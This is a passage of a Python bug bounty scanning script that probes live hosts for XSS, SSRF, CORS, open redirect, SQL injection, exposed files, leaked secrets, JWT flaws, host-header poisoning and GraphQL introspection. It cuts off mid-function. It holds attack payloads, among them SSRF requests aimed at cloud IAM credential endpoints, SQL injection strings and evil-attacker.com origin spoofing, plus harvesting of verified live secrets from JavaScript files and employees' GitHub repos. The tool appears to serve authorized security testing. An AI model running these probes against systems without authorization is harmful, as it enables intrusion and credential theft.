#!/usr/bin/env python3
"""
vuln_scan.py — Full bug bounty vulnerability scan (PDF-researched, 2024-2026 SOTA).

Sources: Jason Haddix BHMv4, NahamSec methodology, PortSwigger research,
         Sam Curry, Frans Rosén, James Kettle, Orange Tsai, InsiderPhD.

Phase A: Nuclei (critical/high CVEs, misconfigs, panels, takeovers)
Phase B: XSS   — gf xss → dalfox (reflected/stored/DOM)
Phase C: SSRF  — gf ssrf → bypass payloads (decimal,IPv6,IDNA) → collab probe
Phase D: CORS  — origin reflection + subdomain regex + null origin
Phase E: Open redirect — gf redirect → validation
Phase F: Sensitive files — admin/actuator/swagger/git/env/backup
Phase G: Secrets — TruffleHog v3 verified-only scan of harvested JS files +
         GitHub repos discovered by github_recon.py (official org + likely
         employee personal repos via email-domain pivot)
Phase H: SQLi  — gf sqli → error-based + NoSQL injection
Phase I: Port scan — naabu + K8s ports (10250/6443/2379)
Phase J: JWT   — alg:none, HS256/RS256 confusion, weak secret, kid injection
Phase K: Host header injection — password reset poisoning, cache poisoning
Phase L: GraphQL — introspection, auth bypass, batching, CSRF via GET
Phase M: SSTI  — template injection polyglot → per-engine RCE check
Phase N: Mass assignment — is_admin:true, role:admin in API PUT/PATCH
Phase O: VHost discovery — ffuf Host header fuzzing (finds apps not in DNS)
Phase P: Content discovery — feroxbuster with assetnote wordlists
Phase Q: Shadow APIs — v1 endpoints still live after v2 ships
Phase R: JSLuice — AST-based JS analysis (endpoints + secret candidates)
Phase S: Kiterunner — API shadow-route discovery via Assetnote routes wordlist
Phase T: CRLF injection (crlfuzz)
Phase U: 403/401 bypass — path tricks + header bypasses on gated endpoints
Phase V: Source-map exposure — leaked .js.map = full source disclosure
Phase W: Cloud enum — Azure/GCP public asset hunting (cloud_enum)

Usage:
  python3 vuln_scan.py \
    --live   /tmp/live.txt \
    --urls   /tmp/all_urls.txt \
    --domain acme.com \
    --org    "Acme" \
    --out    /tmp/bounty_findings.json
"""

import argparse, json, os, re, subprocess, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

GOBIN = os.path.expanduser("~/.recon-tools/bin")
SKILL_DIR = os.path.dirname(__file__)
REFS = os.path.join(SKILL_DIR, "..", "references")

try:
    import requests as _req
    # We intentionally hit hosts with verify=False; silence the per-request
    # InsecureRequestWarning so it doesn't drown the scan output.
    try:
        from urllib3.exceptions import InsecureRequestWarning
        import urllib3
        urllib3.disable_warnings(InsecureRequestWarning)
    except Exception:
        pass
    def get(url, timeout=8, headers=None, **kw):
        try:
            r = _req.get(url, headers={"User-Agent": "Mozilla/5.0", **(headers or {})},
                         timeout=timeout, verify=False, allow_redirects=False, **kw)
            return r.text, dict(r.headers), r.status_code
        except Exception:
            return "", {}, 0
except ImportError:
    def get(url, **kw): return "", {}, 0

def tool(name):
    p = os.path.join(GOBIN, name)
    return p if os.path.isfile(p) else name

def _read_lines(path):
    """Read lines from `path` with a proper context manager. Returns [] if missing.

    Replaces the bare `open(path)` idiom used across this file. Without a
    `with` block, file handles relied on CPython refcount-GC for closure —
    fragile under PyPy and bad practice in long-running scans.
    """
    try:
        with open(path) as fh:
            return fh.readlines()
    except (FileNotFoundError, OSError):
        return []

def run(cmd, timeout=300, input_text=None):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, input=input_text)
        return r.stdout + r.stderr
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return ""

def qsreplace(url, payload):
    """Replace query-string values in `url` with `payload`, safely.

    The old approach piped through `sh -c "echo '<url>' | qsreplace '<payload>'"`,
    which broke whenever the URL or payload contained a single quote — e.g. the
    SQLi payload `' OR '1'='1` got mangled by the shell before qsreplace saw it.
    Feeding the URL on stdin with no shell avoids all quoting/injection issues.
    """
    out = run([tool("qsreplace"), payload], timeout=5, input_text=url + "\n")
    return out.strip().splitlines()[0].strip() if out.strip() else ""

findings = []

def cap(items, n, label):
    """Trim `items` to `n`, and tell the user when there's more to test.

    The caps keep default runs fast and avoid hammering / getting rate-limited by
    the target. This message makes the trade-off visible so the operator knows
    exactly how many candidates went untested and can re-run on the remainder.
    """
    if len(items) > n:
        print(f"  [!] {len(items)} {label} candidates — testing first {n}. "
              f"{len(items) - n} not tested this run (re-run on the remainder to cover them).",
              flush=True)
    return items[:n]

def finding(title, severity, host, detail, evidence="", cwe="", cvss=0.0):
    findings.append({
        "title": title, "severity": severity, "host": host,
        "detail": detail, "evidence": evidence[:500],
        "cwe": cwe, "cvss": cvss,
        "timestamp": datetime.utcnow().isoformat()
    })
    sev_color = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🔵", "info": "⚪"}
    print(f"  {sev_color.get(severity,'⚪')} [{severity.upper()}] {title} — {host}", flush=True)


# ── Phase A: Nuclei ───────────────────────────────────────────────────────────

def phase_nuclei(live_file):
    print("\n[Phase A] Nuclei — critical/high CVEs, misconfigs, panels...", flush=True)
    out = run([
        tool("nuclei"), "-l", live_file,
        "-severity", "critical,high",
        "-tags", "cve,exposure,misconfig,panel,default-login,takeover",
        "-rate-limit", "100",
        "-bulk-size", "25",
        "-concurrency", "10",
        "-timeout", "10",
        "-silent",
        "-jsonl",
    ], timeout=600)

    count = 0
    for line in out.splitlines():
        try:
            ev = json.loads(line)
            sev = ev.get("info", {}).get("severity", "info").lower()
            if sev in ("critical", "high", "medium"):
                finding(
                    title=ev.get("info", {}).get("name", "Unknown"),
                    severity=sev,
                    host=ev.get("host", ""),
                    detail=ev.get("info", {}).get("description", ""),
                    evidence=ev.get("matched-at", "") + " " + str(ev.get("extracted-results", "")),
                    cvss=ev.get("info", {}).get("classification", {}).get("cvss-score", 0.0),
                    cwe=str(ev.get("info", {}).get("classification", {}).get("cwe-id", "")),
                )
                count += 1
        except Exception:
            pass
    print(f"  [+] Nuclei: {count} findings", flush=True)


# ── Phase B: XSS ─────────────────────────────────────────────────────────────

def phase_xss(urls_file, collab_host=""):
    print("\n[Phase B] XSS — gf filter → dalfox...", flush=True)
    # Filter XSS-likely URLs
    gf_out = run(["sh", "-c",
        f"cat {urls_file} | {tool('gf')} xss 2>/dev/null"],
        timeout=30)
    xss_urls = [l.strip() for l in gf_out.splitlines() if l.strip()]
    if not xss_urls:
        print("  [-] No XSS-likely URLs found", flush=True)
        return
    xss_urls = cap(xss_urls, 500, "XSS")

    import tempfile
    tmp_f = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
    try:
        tmp_f.write("\n".join(xss_urls)); tmp_f.close()
        tmp = tmp_f.name

        dalfox_cmd = [tool("dalfox"), "file", tmp, "--silence", "--no-color",
                      "--output-all", "--format", "json"]
        if collab_host:
            dalfox_cmd += ["-b", collab_host]

        out = run(dalfox_cmd, timeout=300)
    finally:
        try: os.unlink(tmp_f.name)
        except OSError: pass
    count = 0
    for line in out.splitlines():
        try:
            ev = json.loads(line)
            if ev.get("type") in ("VULN", "WEAK"):
                finding(
                    title="Cross-Site Scripting (XSS)",
                    severity="high" if ev.get("type") == "VULN" else "medium",
                    host=ev.get("data", ""),
                    detail=f"XSS found via dalfox. Param: {ev.get('param','')}",
                    evidence=ev.get("evidence", ""),
                    cwe="CWE-79", cvss=6.1
                )
                count += 1
        except Exception:
            # dalfox non-JSON output
            if "VULN" in line or "[POC]" in line:
                finding("Cross-Site Scripting (XSS)", "high", line[:100],
                        "XSS confirmed by dalfox", evidence=line, cwe="CWE-79", cvss=6.1)
                count += 1
    print(f"  [+] XSS: {count} findings from {len(xss_urls)} URLs", flush=True)


# ── Phase C: SSRF ─────────────────────────────────────────────────────────────

def phase_ssrf(urls_file, collab_host=""):
    print("\n[Phase C] SSRF — gf filter → collaborator probe...", flush=True)
    if not collab_host:
        print("  [!] No collaborator host — SSRF probe skipped. Set --collab to enable.", flush=True)
        return

    gf_out = run(["sh", "-c",
        f"cat {urls_file} | {tool('gf')} ssrf 2>/dev/null | head -200"],
        timeout=30)
    ssrf_urls = [l.strip() for l in gf_out.splitlines() if l.strip()]
    if not ssrf_urls:
        print("  [-] No SSRF-likely URLs", flush=True); return

    import tempfile
    # Bypass payloads (Orange Tsai, Black Hat 2017 — URL parser inconsistencies)
    payloads = []
    if collab_host:
        payloads = [f"http://{collab_host}", f"https://{collab_host}"]
    payloads += [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # AWS IMDSv1 → IAM keys
        "http://metadata.google.internal/computeMetadata/v1/",                 # GCP → service account
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",     # Azure
        "http://0177.0.0.1/",    # octal bypass
        "http://2130706433/",    # decimal bypass (127.0.0.1)
        "http://[::1]/",         # IPv6 bypass
        "http://127.1/",         # shorthand bypass
    ]
    # Proof markers — what a real SSRF response contains
    # For collab: check your collab platform for DNS/HTTP hits (manual)
    # For cloud metadata: these strings in response body = confirmed SSRF
    CLOUD_PROOF = {
        "169.254.169.254": ["ami-id", "instance-id", "iam", "security-credentials",
                             "aws_access_key", "AccessKeyId"],
        "metadata.google.internal": ["computeMetadata", "serviceAccounts", "email"],
        "169.254.169.254/metadata": ["compute", "subscriptionId", "resourceGroupName"],
    }

    count = 0
    for url in cap(ssrf_urls, 100, "SSRF"):
        for payload in payloads[:4]:
            modified = qsreplace(url, payload)
            if not modified or modified == url:
                continue
            content, _, status = get(modified, timeout=8)

            # Collab payloads: flag as "unconfirmed — check collab dashboard"
            if collab_host and collab_host in payload:
                if status in (200, 301, 302, 307):
                    finding("SSRF — Check Collaborator (Unconfirmed)", "medium", url,
                            f"Sent collab payload, got HTTP {status}. "
                            f"Verify DNS/HTTP hit in your collaborator dashboard before reporting.",
                            evidence=f"Payload: {payload} | HTTP {status}",
                            cwe="CWE-918", cvss=7.5)
                    count += 1; break

            # Cloud metadata: ONLY flag if response BODY contains cloud metadata content
            for meta_host, proof_strings in CLOUD_PROOF.items():
                if meta_host in payload:
                    if any(p.lower() in content.lower() for p in proof_strings):
                        finding("SSRF — Cloud Metadata Access (Confirmed)", "critical", url,
                                f"Server fetched cloud metadata. Response contains proof: "
                                f"{[p for p in proof_strings if p.lower() in content.lower()]}",
                                evidence=content[:300], cwe="CWE-918", cvss=9.1)
                        count += 1; break
    print(f"  [+] SSRF: {count} findings (collab=unconfirmed, cloud=body-confirmed)", flush=True)


# ── Phase D: CORS ─────────────────────────────────────────────────────────────

def phase_cors(live_file):
    print("\n[Phase D] CORS misconfiguration...", flush=True)
    hosts = cap([l.strip() for l in _read_lines(live_file) if l.strip() and l.startswith("http")], 200, "CORS host")
    count = 0

    def check_cors(host):
        evil = "https://evil-attacker.com"
        _, headers, status = get(host, headers={"Origin": evil}, timeout=5)
        acao = headers.get("Access-Control-Allow-Origin","") or headers.get("access-control-allow-origin","")
        acac = headers.get("Access-Control-Allow-Credentials","") or headers.get("access-control-allow-credentials","")
        if evil in acao or acao == "*":
            sev = "high" if acac.lower() == "true" else "medium"
            return host, sev, acao, acac
        return None

    with ThreadPoolExecutor(max_workers=30) as pool:
        for result in pool.map(check_cors, hosts):
            if result:
                host, sev, acao, acac = result
                finding("CORS Misconfiguration", sev, host,
                        f"Origin reflection: ACAO={acao}, ACAC={acac}",
                        evidence=f"Origin: evil-attacker.com → ACAO: {acao}",
                        cwe="CWE-942", cvss=7.5 if sev == "high" else 5.3)
                count += 1
    print(f"  [+] CORS: {count} findings", flush=True)


# ── Phase E: Open Redirect ────────────────────────────────────────────────────

def _follow_redirects(url, max_hops=10):
    """Follow the full redirect chain, return final URL and hop count.
    This is the ONLY correct way to validate open redirects — checking
    just the first Location header causes false positives when the server
    does HTTP→HTTPS and preserves our payload in the query string.
    """
    try:
        import requests as _r
        resp = _r.get(url, allow_redirects=True, timeout=8,
                      verify=False, headers={"User-Agent": "Mozilla/5.0"})
        return resp.url, resp.history
    except Exception:
        return url, []

def phase_open_redirect(urls_file):
    """
    Open redirect validation — MUST follow full redirect chain.

    Wrong approach (false positives): check if Location header CONTAINS payload.
    Server doing HTTP→HTTPS will echo back query params including our payload:
      GET /?next=https://evil.com → 301 → Location: https://site.com/?next=https://evil.com
    This is NOT an open redirect.

    Correct approach: follow ALL redirects, check if FINAL destination hostname
    is our evil domain. Only flag if the browser would actually land on evil.com.
    Also: only test parameters that are semantically redirect parameters
    (url, next, redirect, return, dest, goto etc.) — not all params.
    """
    print("\n[Phase E] Open Redirect (full redirect chain validation)...", flush=True)
    try:
        import requests as _r
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    except ImportError:
        print("  [-] requests not available", flush=True); return

    # Only replace parameters that are semantically redirect parameters
    REDIRECT_PARAMS = {
        "url", "next", "redirect", "return", "returnto", "return_to",
        "goto", "dest", "destination", "target", "redir", "redirect_url",
        "redirect_uri", "forward", "continue", "back", "ref", "r",
        "location", "to", "link", "path", "site", "view", "page_url",
        "callback", "success_url", "failure_url", "cancel_url",
    }

    EVIL = "https://evil-attacker.com"
    EVIL_HOST = "evil-attacker.com"

    # Build candidate list: only URLs with known redirect params
    gf_out = run(["sh", "-c",
        f"cat {urls_file} | {tool('gf')} redirect 2>/dev/null | head -500"], timeout=30)
    all_candidates = [l.strip() for l in gf_out.splitlines() if l.strip()]

    # Filter to URLs that actually have a redirect-named parameter
    candidates = []
    for u in all_candidates:
        try:
            parsed = urlparse(u)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if any(k.lower() in REDIRECT_PARAMS for k in params):
                candidates.append(u)
        except Exception:
            pass

    if not candidates:
        print("  [-] No URLs with redirect parameters found", flush=True)
        return

    count = 0
    for url in cap(candidates, 50, "open-redirect"):
        try:
            # Build modified URL: replace only redirect-named params with evil payload
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            modified_params = {}
            replaced = False
            for k, v in params.items():
                if k.lower() in REDIRECT_PARAMS:
                    modified_params[k] = [EVIL]
                    replaced = True
                else:
                    modified_params[k] = v
            if not replaced:
                continue

            from urllib.parse import urlencode as _ue
            new_query = _ue({k: v[0] for k, v in modified_params.items()})
            modified_url = urlunparse(parsed._replace(query=new_query))

            # Follow ALL redirects and check FINAL destination
            final_url, history = _follow_redirects(modified_url)
            final_host = urlparse(final_url).netloc.lower()

            # TRUE positive: final destination IS the evil domain
            if EVIL_HOST in final_host:
                hop_chain = " → ".join(
                    [modified_url] + [r.url for r in history] + [final_url]
                )[:300]
                finding("Open Redirect (Confirmed)", "medium", url,
                        f"Browser follows full chain and lands on {EVIL_HOST}. "
                        f"Vulnerable parameter: {[k for k in modified_params if k.lower() in REDIRECT_PARAMS]}",
                        evidence=f"Chain: {hop_chain}",
                        cwe="CWE-601", cvss=6.1)
                count += 1
        except Exception:
            pass

    print(f"  [+] Open Redirect: {count} CONFIRMED findings (false positives eliminated)", flush=True)


# ── Phase F: Sensitive File Exposure ─────────────────────────────────────────

def phase_sensitive_files(live_file):
    print("\n[Phase F] Sensitive file exposure...", flush=True)
    SENSITIVE_PATHS = [
        "/.git/HEAD", "/.git/config", "/.env", "/.env.backup", "/.env.local",
        "/config.json", "/config.yaml", "/config.yml", "/settings.json",
        "/backup.sql", "/dump.sql", "/database.sql",
        "/phpinfo.php", "/.htaccess", "/web.config",
        "/admin", "/admin/", "/administrator", "/wp-admin/",
        "/api/v1/admin", "/api/swagger", "/swagger.json", "/openapi.json",
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
        "/.DS_Store", "/server-status", "/server-info",
        "/crossdomain.xml", "/clientaccesspolicy.xml",
        "/robots.txt", "/sitemap.xml",
        "/__debug__/", "/debug", "/trace",
        "/graphql", "/graphiql", "/playground",
    ]

    hosts = cap([l.strip().rstrip("/") for l in _read_lines(live_file) if l.strip() and l.startswith("http")], 100, "sensitive-file host")
    count = 0

    def check_path(args):
        host, path = args
        url = f"{host}{path}"
        content, headers, status = get(url, timeout=5)
        if status in (200,):  # 403 = blocked, NOT a finding. Never report 403 as sensitive.
            ct = headers.get("Content-Type","") or headers.get("content-type","")
            # Check for sensitive content indicators
            sensitive_indicators = [
                "DB_PASSWORD", "DB_HOST", "SECRET_KEY", "API_KEY",
                "AWS_ACCESS", "[core]", "ref: refs/heads",  # .git
                "phpinfo()", "PHP Version",
                "swagger", "openapi",
            ]
            for indicator in sensitive_indicators:
                if indicator.lower() in content.lower():
                    sev = "high" if any(x in content for x in ["password","secret","key","token"]) else "medium"
                    return (url, status, sev, indicator, content[:200])
            if status == 200 and any(p in path for p in ["/admin","/actuator","/graphql","/graphiql"]):
                return (url, status, "high", "exposed panel", content[:200])
        return None

    from concurrent.futures import ThreadPoolExecutor
    tasks = [(h, p) for h in hosts for p in SENSITIVE_PATHS]
    with ThreadPoolExecutor(max_workers=40) as pool:
        for result in pool.map(check_path, tasks):
            if result:
                url, status, sev, indicator, snippet = result
                finding(f"Sensitive File/Endpoint Exposed: {indicator}", sev, url,
                        f"HTTP {status} — contains indicator: {indicator}",
                        evidence=snippet, cwe="CWE-200", cvss=7.5 if sev=="high" else 5.3)
                count += 1
    print(f"  [+] Sensitive files: {count} findings", flush=True)


# ── Phase G: Secret Scanning (TruffleHog v3 — verified only) ─────────────────

# Detector names from trufflehog that map to "if it's live, this is critical".
# Anything verified outside this list still emits "high" — verification alone
# already eliminates the regex false-positive flood.
_CRITICAL_DETECTORS = {
    "aws", "awssessionkey", "gcp", "gcpapplicationdefaultcredentials",
    "azurestorage", "azurekeyvault", "azureservicebus", "azuresearch",
    "github", "githubapp", "gitlab", "bitbucket",
    "stripe", "paypal", "braintree", "adyen", "square",
    "slack", "discord", "twilio", "sendgrid", "mailgun", "mailchimp",
    "privatekey", "jwt", "rsaprivatekey", "sshprivatekey",
    "digitalocean", "heroku", "vercel", "netlify", "fly",
    "dockerhub", "npm", "pypi", "rubygems",
    "mongodb", "postgres", "mysql", "redis", "elasticsearch",
    "datadog", "newrelic", "pagerduty", "sentry",
    "openai", "anthropic", "huggingface", "cohere", "replicate",
}

def _parse_trufflehog(raw, source="filesystem", url_map=None, repo="", tier=""):
    """Parse v3 JSONL output → finding() calls. Returns count emitted."""
    count = 0
    for line in raw.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            ev = json.loads(line)
        except json.JSONDecodeError:
            continue
        if not ev.get("Verified", False):
            continue  # belt + braces — --only-verified already filters

        detector = ev.get("DetectorName", "Unknown")
        redacted = ev.get("Redacted") or (ev.get("Raw", "") + "")[:40] + "…"

        # Source location — TruffleHog reports this differently per source type.
        sm = (ev.get("SourceMetadata") or {}).get("Data", {}) or {}
        if "Git" in sm:
            g = sm["Git"]
            location = f"{g.get('repository', repo or '?')} @ {(g.get('commit') or '')[:8]} : {g.get('file', '?')}"
        elif "Github" in sm:
            g = sm["Github"]
            location = f"{g.get('repository', repo or '?')} : {g.get('file', '?')}"
        elif "Filesystem" in sm:
            fp = sm["Filesystem"].get("file", "?")
            location = (url_map or {}).get(fp, fp)
        else:
            location = repo or "unknown"

        sev = "critical" if detector.lower() in _CRITICAL_DETECTORS else "high"
        title = f"Verified Secret Leak: {detector}"
        detail = (f"TruffleHog confirmed this {detector} credential is LIVE "
                  f"(test-fired against provider API). Source: {source}.")
        if tier:
            detail += f" Repo ownership tier: {tier}."

        finding(title, sev, location, detail,
                evidence=f"Redacted: {redacted}", cwe="CWE-798",
                cvss=9.8 if sev == "critical" else 8.5)
        count += 1
    return count


def phase_secrets(urls_file, github_repos_json=""):
    """Phase G: TruffleHog v3 verified secret scanning.

    Two sources fused into one phase:
      1. JS files harvested during URL collection — downloaded to a temp dir
         and scanned with `trufflehog filesystem --only-verified`.
      2. GitHub repos from github_recon.py (CONFIRMED + LIKELY tiers) — scanned
         with `trufflehog github --repo <url> --only-verified`.

    `--only-verified` means each candidate secret was test-fired against its
    provider's API and confirmed live. False-positive rate is dramatically
    lower than the old regex approach; H1 closes unverified secret reports.
    """
    import hashlib, shutil, tempfile

    print("\n[Phase G] TruffleHog verified secret scanning...", flush=True)

    trufflehog_bin = tool("trufflehog")
    # `tool()` returns the bare name when the GOBIN binary is missing — that
    # also covers `command -v trufflehog` (brew-installed), so just probe
    # both shapes explicitly here.
    import shutil as _sh
    if not (os.path.isfile(trufflehog_bin) or _sh.which(trufflehog_bin)):
        print("  [-] trufflehog not installed — Phase G skipped. "
              "Run install_tools.sh or `brew install trufflehog`.", flush=True)
        return

    count = 0

    # ── Source 1: harvested JS files ─────────────────────────────────────────
    js_urls = [l.strip() for l in _read_lines(urls_file)
               if l.strip() and ".js" in l and "?" not in l]
    js_urls = cap(js_urls, 200, "JS file")

    if js_urls:
        js_dir = tempfile.mkdtemp(prefix="br_js_")
        url_map = {}
        try:
            def fetch(url):
                content, _, status = get(url, timeout=8)
                if status == 200 and content:
                    fn = hashlib.md5(url.encode()).hexdigest() + ".js"
                    path = os.path.join(js_dir, fn)
                    try:
                        with open(path, "w", encoding="utf-8", errors="replace") as fh:
                            fh.write(content)
                        return (url, path)
                    except OSError:
                        return None
                return None

            with ThreadPoolExecutor(max_workers=20) as pool:
                fetched = [r for r in pool.map(fetch, js_urls) if r]

            for url, path in fetched:
                url_map[path] = url

            print(f"  [*] Downloaded {len(fetched)}/{len(js_urls)} JS files; "
                  f"scanning with trufflehog filesystem…", flush=True)

            if fetched:
                out = run([trufflehog_bin, "filesystem", js_dir,
                           "--only-verified", "--json", "--no-update"],
                          timeout=600)
                count += _parse_trufflehog(out, source="js", url_map=url_map)
        finally:
            shutil.rmtree(js_dir, ignore_errors=True)
    else:
        print("  [-] No JS files in URL set", flush=True)

    # ── Source 2: GitHub repos from github_recon ─────────────────────────────
    if github_repos_json and os.path.isfile(github_repos_json):
        try:
            with open(github_repos_json) as fh:
                gh_data = json.load(fh)
            repos = gh_data.get("repos", [])
        except (json.JSONDecodeError, OSError):
            repos = []

        # TruffleHog `github --repo` clones via the API → needs a token. Source
        # one from gh CLI if the env var isn't already set.
        if repos and not os.environ.get("GITHUB_TOKEN"):
            try:
                tok = subprocess.run(["gh", "auth", "token"],
                                     capture_output=True, text=True, timeout=10)
                if tok.returncode == 0 and tok.stdout.strip():
                    os.environ["GITHUB_TOKEN"] = tok.stdout.strip()
                    print("  [*] Sourced GITHUB_TOKEN from `gh auth token`", flush=True)
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass

        if not repos:
            print("  [-] No GitHub repos to scan (run github_recon.py first)", flush=True)
        elif not os.environ.get("GITHUB_TOKEN"):
            print("  [!] GITHUB_TOKEN not set and `gh auth token` unavailable — "
                  "skipping GitHub repo scan.", flush=True)
        else:
            tiered_repos = [r for r in repos
                            if r.get("tier") in ("CONFIRMED", "LIKELY")]
            tiered_repos = cap(tiered_repos, 30, "GitHub repo")
            print(f"  [*] Scanning {len(tiered_repos)} GitHub repos "
                  f"(CONFIRMED + LIKELY)…", flush=True)

            for repo in tiered_repos:
                clone_url = repo.get("clone_url") or repo.get("html_url")
                if not clone_url:
                    continue
                full_name = repo.get("full_name", "?")
                tier = repo.get("tier", "")
                out = run([trufflehog_bin, "github",
                           "--repo", clone_url,
                           "--only-verified", "--json", "--no-update"],
                          timeout=300)
                emitted = _parse_trufflehog(out, source="github",
                                            repo=full_name, tier=tier)
                if emitted:
                    print(f"    [!] {emitted} verified secret(s) in "
                          f"{full_name} [{tier}]", flush=True)
                count += emitted

    print(f"  [+] TruffleHog: {count} verified secrets", flush=True)


# ── Phase H: SQLi screening ───────────────────────────────────────────────────

def phase_sqli(urls_file):
    """Screen for SQL injection candidates - gf pattern filter only (no sqlmap destruction)."""
    print("\n[Phase H] SQLi — gf filter + error-based detection...", flush=True)
    gf_out = run(["sh", "-c",
        f"cat {urls_file} | {tool('gf')} sqli 2>/dev/null | head -200"], timeout=30)
    sqli_urls = [l.strip() for l in gf_out.splitlines() if l.strip()]
    if not sqli_urls:
        print("  [-] No SQLi-likely URLs", flush=True); return

    SQL_ERRORS = [
        "sql syntax", "mysql_fetch", "pg_query", "sqlite_", "ora-",
        "syntax error", "unclosed quotation", "quoted string",
        "you have an error in your sql", "warning: mysql",
    ]

    count = 0
    payloads = ["'", "\"", "' OR '1'='1", "1 AND 1=1--"]
    for url in cap(sqli_urls, 50, "SQLi"):
        for payload in payloads[:2]:
            modified = qsreplace(url, payload)
            if not modified or modified == url: continue
            content, _, status = get(modified, timeout=5)
            for err in SQL_ERRORS:
                if err in content.lower():
                    finding("SQL Injection (Error-Based)", "critical", url,
                            f"SQL error triggered with payload: {payload}",
                            evidence=content[:200], cwe="CWE-89", cvss=9.8)
                    count += 1; break
    print(f"  [+] SQLi: {count} potential findings", flush=True)


# ── Phase I: Port Scan ────────────────────────────────────────────────────────

def phase_ports(live_file):
    print("\n[Phase I] Port scan — naabu on interesting ports...", flush=True)
    # Extract IPs/hostnames
    hosts = cap([l.strip().replace("https://","").replace("http://","").split("/")[0]
             for l in _read_lines(live_file) if l.strip() and l.startswith("http")], 50, "port-scan host")

    import tempfile
    tmp_f = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
    try:
        tmp_f.write("\n".join(set(hosts))); tmp_f.close()

        # Interesting ports for bug bounty
        INTERESTING_PORTS = "21,22,23,25,80,81,443,445,3000,3306,5432,5900,6379,8000,8080,8443,8888,9000,9200,27017"
        out = run([
            tool("naabu"), "-l", tmp_f.name,
            "-p", INTERESTING_PORTS,
            "-silent", "-json"
        ], timeout=120)
    finally:
        try: os.unlink(tmp_f.name)
        except OSError: pass

    count = 0
    for line in out.splitlines():
        try:
            ev = json.loads(line)
            port = ev.get("port", 0)
            host = ev.get("host", "")
            RISKY = {22: "SSH exposed", 23: "Telnet exposed", 3306: "MySQL exposed",
                     5432: "PostgreSQL exposed", 6379: "Redis exposed",
                     27017: "MongoDB exposed", 9200: "Elasticsearch exposed",
                     5900: "VNC exposed"}
            if port in RISKY:
                finding(f"Exposed Service: {RISKY[port]}", "high",
                        f"{host}:{port}",
                        f"Port {port} is directly accessible from internet",
                        cwe="CWE-284", cvss=7.5)
                count += 1
        except Exception:
            pass
    print(f"  [+] Port scan: {count} risky services found", flush=True)


# ── Phase J: JWT Attacks ─────────────────────────────────────────────────────

def phase_jwt(live_file):
    """PDF 2.2: alg:none, HS256/RS256 confusion, kid injection, weak secret."""
    print("\n[Phase J] JWT attacks...", flush=True)
    hosts = cap([l.strip() for l in _read_lines(live_file) if l.strip() and l.startswith("http")], 50, "JWT host")
    count = 0
    for host in hosts:
        # Check for .well-known/jwks.json (reveals RSA public key → HS256 confusion)
        for path in ["/.well-known/jwks.json", "/jwks.json", "/api/jwks",
                     "/oauth/token", "/api/v1/auth/token", "/auth/token"]:
            content, headers, status = get(f"{host}{path}", timeout=5)
            if status == 200 and ("keys" in content or "kty" in content):
                finding("JWT Key Endpoint Exposed", "medium", f"{host}{path}",
                        "JWKS endpoint exposed — enables HS256/RS256 confusion attack",
                        evidence=content[:150], cwe="CWE-327", cvss=7.5)
                count += 1
            # Check for JWT in response headers that uses alg:none pattern
            if "Authorization" in str(headers) or "eyJ" in content:
                import base64 as _b64
                for match in re.findall(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.([A-Za-z0-9_\-]*)', content):
                    if match == "" or match == "AA==":
                        finding("JWT Algorithm None Accepted", "critical", host,
                                "JWT with empty/null signature accepted",
                                evidence=f"alg:none signature: {match}", cwe="CWE-347", cvss=9.1)
                        count += 1
    print(f"  [+] JWT: {count} findings", flush=True)


# ── Phase K: Host Header Injection ───────────────────────────────────────────

def phase_host_header(live_file, collab_host=""):
    """PDF §2.5: Password reset poisoning + cache poisoning via Host header."""
    print("\n[Phase K] Host header injection...", flush=True)
    hosts = cap([l.strip() for l in _read_lines(live_file) if l.strip() and l.startswith("http")], 100, "host-header host")
    count = 0

    RESET_PATHS = ["/forgot-password", "/reset-password", "/password-reset",
                   "/account/forgot", "/user/forgot-password", "/auth/forgot"]
    for host in hosts:
        for path in RESET_PATHS:
            evil = collab_host or "evil-attacker.com"
            content, _, status = get(f"{host}{path}",
                                     headers={"Host": evil,
                                              "X-Forwarded-Host": evil,
                                              "X-Forwarded-For": "127.0.0.1"}, timeout=5)
            if status in (200, 302) and (evil in content or "reset" in content.lower()):
                finding("Host Header Injection (Password Reset Poisoning)", "high",
                        f"{host}{path}",
                        f"Host header reflected in response — password reset link can be poisoned",
                        evidence=content[:200], cwe="CWE-640", cvss=8.8)
                count += 1
    print(f"  [+] Host header: {count} findings", flush=True)


# ── Phase L: GraphQL ─────────────────────────────────────────────────────────

def phase_graphql(live_file):
    """PDF 3.2: Introspection, auth bypass, batching attacks, CSRF via GET."""
    print("\n[Phase L] GraphQL...", flush=True)
    hosts = cap([l.strip() for l in _read_lines(live_file) if l.strip() and l.startswith("http")], 100, "GraphQL host")
    count = 0

    GQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/graphiql",
                 "/playground", "/api/v1/graphql", "/query"]
    INTROSPECTION = '{"query":"{__schema{queryType{name}}}"}'

    for host in hosts:
        for path in GQL_PATHS:
            content, headers, status = get(f"{host}{path}", timeout=5)
            if status != 200 or not content: continue
            # Test introspection
            try:
                import urllib.request, urllib.error
                req = urllib.request.Request(
                    f"{host}{path}",
                    data=INTROSPECTION.encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
                )
                resp_data = urllib.request.urlopen(req, timeout=8).read().decode()
                if "__schema" in resp_data or "queryType" in resp_data:
                    finding("GraphQL Introspection Enabled", "medium", f"{host}{path}",
                            "GraphQL schema fully exposed via introspection — reveals all mutations/queries",
                            evidence=resp_data[:200], cwe="CWE-200", cvss=5.3)
                    count += 1
                # Test auth bypass on mutations
                MUTATION = '{"query":"mutation{__typename}"}'
                req2 = urllib.request.Request(
                    f"{host}{path}", data=MUTATION.encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
                )
